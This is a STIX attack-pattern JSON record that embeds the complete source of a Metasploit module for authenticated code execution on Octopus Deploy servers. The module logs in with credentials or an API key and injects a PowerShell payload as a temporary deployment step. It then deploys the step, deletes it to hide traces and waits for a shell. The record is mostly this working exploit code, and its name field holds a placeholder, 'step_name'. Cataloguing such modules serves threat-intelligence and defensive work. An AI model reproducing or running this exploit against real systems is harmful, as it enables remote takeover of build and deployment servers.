{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--45bf3c9f-1371-4301-ad35-e6e6b79a5226",
    "created": "2024-08-14T16:52:43.380758Z",
    "modified": "2024-08-14T16:52:43.380762Z",
    "name": "step_name",
    "description": " This module can be used to execute a payload on an Octopus Deploy server given valid credentials or an API key. The payload is executed as a powershell script step on the Octopus Deploy server during a deployment.  'License'     => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/octopusdeploy_deploy.rb",
            "external_id": "octopusdeploy_deploy.rb"
        },
        {
            "source_name": "reference",
            "url": "https://octopus.com"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Octopus Deploy Authenticated Code Execution',\n      'Description' => %q{\n          This module can be used to execute a payload on an Octopus Deploy server given\n          valid credentials or an API key. The payload is executed as a powershell script step\n          on the Octopus Deploy server during a deployment.\n      },\n      'License'     => MSF_LICENSE,\n      'Author'      => [ 'James Otten <jamesotten1[at]gmail.com>' ],\n      'References'  =>\n        [\n          # Octopus Deploy docs\n          [ 'URL', 'https://octopus.com' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'WfsDelay'    => 30,\n          'EXITFUNC'    => 'process'\n        },\n      'Platform'        => 'win',\n      'Targets'         =>\n        [\n          [ 'Windows Powershell', { 'Platform' => [ 'windows' ], 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]\n        ],\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2017-05-15'\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ false, 'The username to authenticate as' ]),\n        OptString.new('PASSWORD', [ false, 'The password for the specified username' ]),\n        OptString.new('APIKEY', [ false, 'API key to use instead of username and password']),\n        OptString.new('PATH', [ true, 'URI of the Octopus Deploy server. Default is /', '/']),\n        OptString.new('STEPNAME', [false, 'Name of the script step that will be temporarily added'])\n      ]\n    )\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    res = nil\n    if datastore['APIKEY']\n      res = check_api_key\n    elsif datastore['USERNAME'] && datastore['PASSWORD']\n      res = do_login\n    else\n      begin\n        fail_with(Failure::BadConfig, 'Need username and password or API key')\n      rescue Msf::Exploit::Failed => e\n        vprint_error(e.message)\n        return CheckCode::Unknown\n      end\n    end\n    disconnect\n    return CheckCode::Unknown if res.nil?\n    if res.code.between?(400, 499)\n      vprint_error(\"Server rejected the credentials\")\n      return CheckCode::Unknown\n    end\n    CheckCode::Appears\n  end\n\n  def exploit\n    # Generate the powershell payload\n    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true, wrap_double_quotes: true)\n    step_name = datastore['STEPNAME'] || rand_text_alphanumeric(4 + rand(32 - 4))\n    session = create_octopus_session unless datastore['APIKEY']\n\n    #\n    # Get project steps\n    #\n    print_status(\"Getting available projects\")\n    project = get_project(session)\n    project_id = project['Id']\n    project_name = project['Name']\n    print_status(\"Using project #{project_name}\")\n\n    print_status(\"Getting steps to #{project_name}\")\n    steps = get_steps(session, project_id)\n    added_step = make_powershell_step(command, step_name)\n    steps['Steps'].insert(0, added_step)\n    modified_steps = JSON.pretty_generate(steps)\n\n    #\n    # Add step\n    #\n    print_status(\"Adding step #{step_name} to #{project_name}\")\n    put_steps(session, project_id, modified_steps)\n\n    #\n    # Make release\n    #\n    print_status('Getting available channels')\n    channels = get_channel(session, project_id)\n    channel = channels['Items'][0]['Id']\n    channel_name = channels['Items'][0]['Name']\n    print_status(\"Using channel #{channel_name}\")\n\n    print_status('Getting next version')\n    version = get_version(session, project_id, channel)\n    print_status(\"Using version #{version}\")\n\n    release_params = {\n      \"ProjectId\"        => project_id,\n      \"ChannelId\"        => channel,\n      \"Version\"          => version,\n      \"SelectedPackages\" => []\n    }\n    release_params_str = JSON.pretty_generate(release_params)\n    print_status('Creating release')\n    release_id = do_release(session, release_params_str)\n    print_status(\"Release #{release_id} created\")\n\n    #\n    # Deploy\n    #\n    dash = do_get_dashboard(session, project_id)\n\n    environment = dash['Environments'][0]['Id']\n    environment_name = dash['Environments'][0]['Name']\n    skip_steps = do_get_skip_steps(session, release_id, environment, step_name)\n    deployment_params = {\n      'ReleaseId'            => release_id,\n      'EnvironmentId'        => environment,\n      'SkipActions'          => skip_steps,\n      'ForcePackageDownload' => 'False',\n      'UseGuidedFailure'     => 'False',\n      'FormValues'           => {}\n    }\n    deployment_params_str = JSON.pretty_generate(deployment_params)\n    print_status(\"Deploying #{project_name} version #{version} to #{environment_name}\")\n    do_deployment(session, deployment_params_str)\n\n    #\n    # Delete step\n    #\n    print_status(\"Getting updated steps to #{project_name}\")\n    steps = get_steps(session, project_id)\n    print_status(\"Deleting step #{step_name} from #{project_name}\")\n    steps['Steps'].each do |item|\n      steps['Steps'].delete(item) if item['Name'] == step_name\n    end\n    modified_steps = JSON.pretty_generate(steps)\n    put_steps(session, project_id, modified_steps)\n    print_status(\"Step #{step_name} deleted\")\n\n    #\n    # Wait for shell\n    #\n    handler\n  end\n\n  def get_project(session)\n    path = 'api/projects'\n    res = send_octopus_get_request(session, path, 'Get projects')\n    body = parse_json_response(res)\n    body['Items'].each do |item|\n      return item if item['IsDisabled'] == false\n    end\n    fail_with(Failure::Unknown, 'No suitable projects found.')\n  end\n\n  def get_steps(session, project_id)\n    path = \"api/deploymentprocesses/deploymentprocess-#{project_id}\"\n    res = send_octopus_get_request(session, path, 'Get steps')\n    body = parse_json_response(res)\n    body\n  end\n\n  def put_steps(session, project_id, steps)\n    path = \"api/deploymentprocesses/deploymentprocess-#{project_id}\"\n    send_octopus_put_request(session, path, 'Put steps', steps)\n  end\n\n  def get_channel(session, project_id)\n    path = \"api/projects/#{project_id}/channels\"\n    res = send_octopus_get_request(session, path, 'Get channel')\n    parse_json_response(res)\n  end\n\n  def get_version(session, project_id, channel)\n    path = \"api/deploymentprocesses/deploymentprocess-#{project_id}/template?channel=#{channel}\"\n    res = send_octopus_get_request(session, path, 'Get version')\n    body = parse_json_response(res)\n    body['NextVersionIncrement']\n  end\n\n  def do_get_skip_steps(session, release, environment, payload_step_name)\n    path = \"api/releases/#{release}/deployments/preview/#{environment}\"\n    res = send_octopus_get_request(session, path, 'Get skip steps')\n    body = parse_json_response(res)\n    skip_steps = []\n    body['StepsToExecute'].each do |item|\n      if (!item['ActionName'].eql? payload_step_name) && item['CanBeSkipped']\n        skip_steps.push(item['ActionId'])\n      end\n    end\n    skip_steps\n  end\n\n  def do_release(session, params)\n    path = 'api/releases'\n    res = send_octopus_post_request(session, path, 'Do release', params)\n    body = parse_json_response(res)\n    body['Id']\n  end\n\n  def do_get_dashboard(session, project_id)\n    path = \"api/dashboard/dynamic?includePrevious=true&projects=#{project_id}\"\n    res = send_octopus_get_request(session, path, 'Get dashboard')\n    parse_json_response(res)\n  end\n\n  def do_deployment(session, params)\n    path = 'api/deployments'\n    send_octopus_post_request(session, path, 'Do deployment', params)\n  end\n\n  def make_powershell_step(ps_payload, step_name)\n    prop = {\n      'Octopus.Action.RunOnServer' => 'true',\n      'Octopus.Action.Script.Syntax' => 'PowerShell',\n      'Octopus.Action.Script.ScriptSource' => 'Inline',\n      'Octopus.Action.Script.ScriptBody' => ps_payload\n    }\n    step = {\n      'Name' => step_name,\n      'Environments' => [],\n      'Channels' => [],\n      'TenantTags' => [],\n      'Properties' => { 'Octopus.Action.TargetRoles' => '' },\n      'Condition' => 'Always',\n      'StartTrigger' => 'StartWithPrevious',\n      'Actions' => [ { 'ActionType' => 'Octopus.Script', 'Name' => step_name, 'Properties' => prop } ]\n    }\n    step\n  end\n\n  def send_octopus_get_request(session, path, nice_name = '')\n    request_path = normalize_uri(datastore['PATH'], path)\n    headers = create_request_headers(session)\n    res = send_request_raw(\n      'method' => 'GET',\n      'uri' => request_path,\n      'headers' => headers,\n      'SSL' => ssl\n    )\n    check_result_status(res, request_path, nice_name)\n    res\n  end\n\n  def send_octopus_post_request(session, path, nice_name, data)\n    res = send_octopus_data_request(session, path, data, 'POST')\n    check_result_status(res, path, nice_name)\n    res\n  end\n\n  def send_octopus_put_request(session, path, nice_name, data)\n    res = send_octopus_data_request(session, path, data, 'PUT')\n    check_result_status(res, path, nice_name)\n    res\n  end\n\n  def send_octopus_data_request(session, path, data, method)\n    request_path = normalize_uri(datastore['PATH'], path)\n    headers = create_request_headers(session)\n    headers['Content-Type'] = 'application/json'\n    res = send_request_raw(\n      'method' => method,\n      'uri' => request_path,\n      'headers' => headers,\n      'data' => data,\n      'SSL' => ssl\n    )\n    res\n  end\n\n  def check_result_status(res, request_path, nice_name)\n    if !res || res.code < 200 || res.code >= 300\n      req_name = nice_name || 'Request'\n      fail_with(Failure::UnexpectedReply, \"#{req_name} failed #{request_path} [#{res.code} #{res.message}]\")\n    end\n  end\n\n  def create_request_headers(session)\n    headers = {}\n    if session.blank?\n      headers['X-Octopus-ApiKey'] = datastore['APIKEY']\n    else\n      headers['Cookie'] = session\n      headers['X-Octopus-Csrf-Token'] = get_csrf_token(session, 'Octopus-Csrf-Token')\n    end\n    headers\n  end\n\n  def get_csrf_token(session, csrf_cookie)\n    key_vals = session.scan(/\\s?([^, ;]+?)=([^, ;]*?)[;,]/)\n    key_vals.each do |name, value|\n      return value if name.starts_with?(csrf_cookie)\n    end\n    fail_with(Failure::Unknown, 'CSRF token not found')\n  end\n\n  def parse_json_response(res)\n    begin\n      json = JSON.parse(res.body)\n      return json\n    rescue JSON::ParserError\n      fail_with(Failure::Unknown, 'Failed to parse response json')\n    end\n  end\n\n  def create_octopus_session\n    res = do_login\n    if res && res.code == 404\n      fail_with(Failure::BadConfig, 'Incorrect path')\n    elsif !res || (res.code != 200)\n      fail_with(Failure::NoAccess, 'Could not initiate session')\n    end\n    res.get_cookies\n  end\n\n  def do_login\n    json_post_data = JSON.pretty_generate({ Username: datastore['USERNAME'], Password: datastore['PASSWORD'] })\n    path = normalize_uri(datastore['PATH'], '/api/users/login')\n    res = send_request_raw(\n      'method' => 'POST',\n      'uri' => path,\n      'ctype' => 'application/json',\n      'data' => json_post_data,\n      'SSL' => ssl\n    )\n\n    if !res || (res.code != 200)\n      print_error(\"Login failed\")\n    elsif res.code == 200\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n    end\n\n    res\n  end\n\n  def check_api_key\n    headers = {}\n    headers['X-Octopus-ApiKey'] = datastore['APIKEY'] || ''\n    path = normalize_uri(datastore['PATH'], '/api/serverstatus')\n    res = send_request_raw(\n      'method' => 'GET',\n      'uri' => path,\n      'headers' => headers,\n      'SSL' => ssl\n    )\n\n    print_error(\"Login failed\") if !res || (res.code != 200)\n\n    vprint_status(res.body)\n\n    res\n  end\n\n  def service_details\n    super.merge({ access_level: 'Admin' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-15",
    "x_mitre_platforms": [
        "win'"
    ]
}